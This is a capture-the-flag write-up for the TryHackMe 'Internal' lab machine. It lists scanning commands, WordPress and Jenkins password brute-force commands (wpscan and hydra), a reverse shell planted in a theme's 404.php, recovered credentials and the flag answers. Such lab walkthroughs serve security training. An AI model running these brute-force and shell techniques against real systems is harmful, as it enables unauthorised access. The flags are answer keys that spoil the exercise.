
<h1 align='center'> [THM] Internal </h1>

<br><hr><br>

## Client Details:-

- Machine: `Internal`
- Url: `http://internal.thm`
- IP Address: `10.10.169.15`

- _Scope of work:_
	- find __user.txt__ (gain sys shell) & __root.txt__ (privesc)
	- report any/all vulnerabilities found doing so

<br><hr><br>

## Penetration Test:- 
> find step-by-step pentest notes [here](./notes.md)

### Reconnaissance & Scanning:

- Nmap scan [[results](./nmap.log)]
	- cmd: `nmap -sC -sV -A -o nmap.log internal.thm`

- Gobuster scan [[results](./gobuster_0.log)]: main ip/domain
	- cmd: `gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_0.log`

- Gobuster scan [[results](./gobuster_1.log)]: blog site
	- cmd: `gobuster dir -u http://internal.thm/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_1.log`

- WPScan [[results](./wpscan.log)]
	- cmd: `wpscan --url http://internal.thm/blog/ -e vp,vt,tt,cb,dbe,u,m -o wpscan.log`

### Gaining Access:

- WPScan [[results](./wpscan_user_bf.log)]: user login brute force
	- cmd: `wpscan --url http://internal.thm/blog/ -P /usr/share/wordlists/rockyou.txt -o wpscan_user_bf.log`

- Login found for _wordpress admin_:
	- username: `admin`
	- password: `my2boys`

- Got __reverse shell__ (`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`) 

- Got user credentials:
	- username: `aubreanna`
	- password: `bubb13guM!@#123`

- Got `user.txt` flag: `THM{int3rna1_fl4g_1}`

- Got _Jenkins_ logins by brute force:
	- username: `admin`
	- password: `spongebob`
	- cmd: `hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form -s 9999 "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"`

- Got `root.txt` flag: `THM{d0ck3r_d3str0y3r}`
